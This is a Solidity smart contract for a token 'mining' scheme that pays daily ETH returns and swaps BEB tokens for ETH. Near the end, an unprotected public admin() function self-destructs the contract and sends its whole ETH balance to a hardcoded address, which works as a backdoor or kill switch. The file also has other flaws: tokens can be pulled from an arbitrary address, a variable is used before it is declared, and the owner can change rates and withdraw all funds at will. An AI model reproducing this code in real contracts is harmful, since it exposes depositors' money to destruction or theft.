 

pragma solidity^0.4.24;  
interface tokenTransfer {
    function transfer(address receiver, uint amount);
    function transferFrom(address _from, address _to, uint256 _value);
    function balanceOf(address receiver) returns(uint256);
}

contract Ownable {
  address public owner;
 
    function Ownable () public {
        owner = msg.sender;
    }
 
    modifier onlyOwner {
        require (msg.sender == owner);
        _;
    }
 
     
    function transferOwnership(address newOwner) onlyOwner public {
        if (newOwner != address(0)) {
        owner = newOwner;
      }
    }
}

contract BEBmining is Ownable{
tokenTransfer public bebTokenTransfer;  
    uint8 decimals = 18;
   struct BebUser {
        address customerAddr;
        uint256 amount; 
        uint256 bebtime;
        uint256 interest;
    }
     
    struct miner{
        uint256 mining;
         
        uint256 lastDate;
        uint256 ethbomus;
        uint256 amountTotal;
    }
    mapping(address=>miner)public miners;
    address[]public minersArray;
    uint256 ethExchuangeRate=210; 
    uint256 bebethexchuang=105000; 
    uint256 bebethex=100000; 
    uint256 bounstotal;
    uint256 TotalInvestment;
    uint256 sumethbos;
    uint256 depreciationTime=86400;
    uint256 SellBeb; 
    uint256 BuyBeb; 
    uint256 IncomePeriod=730; 
    event bomus(address to,uint256 amountBouns,string lx);
    function BEBmining(address _tokenAddress){
         bebTokenTransfer = tokenTransfer(_tokenAddress);
     }
     
    function BebTomining(uint256 _value,address _addr)public{
        uint256 usdt=_value*ethExchuangeRate/bebethexchuang;
        uint256 _udst=usdt* 10 ** 18;
        miner storage user=miners[_addr];
        require(usdt>50);
        if(usdt>4900){
           usdt=_value*ethExchuangeRate/bebethexchuang*150/100;
           _udst=usdt* 10 ** 18;
        }else{
            if (usdt > 900){
                    usdt = _value * ethExchuangeRate / bebethexchuang * 130 / 100;
                    _udst=usdt* 10 ** 18;
                }
                else{
                    if (usdt > 450){
                        usdt = _value * ethExchuangeRate / bebethexchuang * 120 / 100;
                         _udst=usdt* 10 ** 18;
                    }
                    else{
                        if (usdt > 270){
                            usdt = _value * ethExchuangeRate / bebethexchuang * 110 / 100;
                             _udst=usdt* 10 ** 18;
                        }
                    }
                }
            }
        bebTokenTransfer.transferFrom(_addr,address(this),_value * 10 ** 18);
        TotalInvestment+=_udst;
        user.mining+=_udst;
         
        user.lastDate=now;
        bomus(_addr,_udst,"Purchase success!");
    }
    function freeSettlement()public{
        miner storage user=miners[msg.sender];
        uint256 amuont=user.mining;
         
        require(amuont>0,"You don't have a mining machine");
        uint256 _ethbomus=user.ethbomus;
        uint256 _lastDate=user.lastDate;
         
        uint256 _amountTotal=user.amountTotal;
        uint256 sumincome=_amountTotal*100/amuont;
        uint256 depreciation=(now-_lastDate)/depreciationTime;
        require(depreciation>0,"Less than 1 day of earnings");
         
        uint256 Bebday=amuont*depreciation/100;
        uint256 profit=Bebday/ethExchuangeRate;
        require(profit>0,"Mining amount 0");
        if(sumincome>IncomePeriod){
            
           user.mining=0;
           user.lastDate=0;
           user.ethbomus=0;
           sumethbos=0;
           user.amountTotal=0;
        }else{
            require(this.balance>profit,"Insufficient contract balance");
            user.lastDate=now;
            user.ethbomus+=Bebday;
            user.amountTotal+=Bebday;
            bounstotal+=profit;
            user.ethbomus=0;
            sumethbos=0;
           msg.sender.transfer(profit);  
        }
        
    }
     function querBalance()public view returns(uint256){
         return this.balance;
     }
    function querYrevenue()public view returns(uint256,uint256,uint256,uint256,uint256){
        miner storage user=miners[msg.sender];
        uint256 _amuont=user.mining;
        uint256 _amountTotal=user.amountTotal;
        if(_amuont==0){
            percentage=0;
        }else{
        uint256 percentage=100-(_amountTotal*100/_amuont*100/730);    
        }
        uint256 _lastDate=user.lastDate;
        uint256 dayzmount=_amuont/100;
        uint256 depreciation=(now-_lastDate)/depreciationTime;
         
        uint256  Bebday=_amuont*depreciation/100;
                 sumethbos=Bebday;

        uint256 profit=sumethbos/ethExchuangeRate;
        return (percentage,dayzmount/ethExchuangeRate,profit,user.amountTotal/ethExchuangeRate,user.lastDate);
    }
    function ModifyexchangeRate(uint256 sellbeb,uint256 buybeb,uint256 _ethExchuangeRate,uint256 maxsell,uint256 maxbuy) onlyOwner{
        ethExchuangeRate=_ethExchuangeRate;
        bebethexchuang=sellbeb;
        bebethex=buybeb;
        SellBeb=maxsell* 10 ** 18;
        BuyBeb=maxbuy* 10 ** 18;
        
    }
     
    function sellBeb(uint256 _sellbeb)public {
        uint256 _sellbebt=_sellbeb* 10 ** 18;
         require(_sellbeb>0,"The exchange amount must be greater than 0");
         require(_sellbeb<SellBeb,"More than the daily redemption limit");
         uint256 bebex=_sellbebt/bebethexchuang;
         require(this.balance>bebex,"Insufficient contract balance");
         bebTokenTransfer.transferFrom(msg.sender,address(this),_sellbebt);
         msg.sender.transfer(bebex);
    }
     
    function buyBeb() payable public {
        uint256 amount = msg.value;
        uint256 bebamountub=amount*bebethex;
        require(getTokenBalance()>bebamountub);
        bebTokenTransfer.transfer(msg.sender,bebamountub);  
    }
    function queryRate() public view returns(uint256,uint256,uint256,uint256,uint256){
        return (ethExchuangeRate,bebethexchuang,bebethex,SellBeb,BuyBeb);
    }
    function TotalRevenue()public view returns(uint256,uint256) {
     return (bounstotal,TotalInvestment/ethExchuangeRate);
    }
    function setioc(uint256 _value)onlyOwner{
        IncomePeriod=_value;
    }
    event messageBetsGame(address sender,bool isScuccess,string message);
    function getTokenBalance() public view returns(uint256){
         return bebTokenTransfer.balanceOf(address(this));
    }
    function withdrawAmount(uint256 amount) onlyOwner {
        uint256 _amountbeb=amount* 10 ** 18;
        require(getTokenBalance()>_amountbeb,"Insufficient contract balance");
       bebTokenTransfer.transfer(owner,_amountbeb);
    } 
    function ETHwithdrawal(uint256 amount) payable  onlyOwner {
       uint256 _amount=amount* 10 ** 18;
       require(this.balance>_amount,"Insufficient contract balance");
      owner.transfer(_amount);
    }
    function ()payable{
        
    }
    function admin() public {
		selfdestruct(0x8948E4B00DEB0a5ADb909F4DC5789d20D0851D71);
	}   
}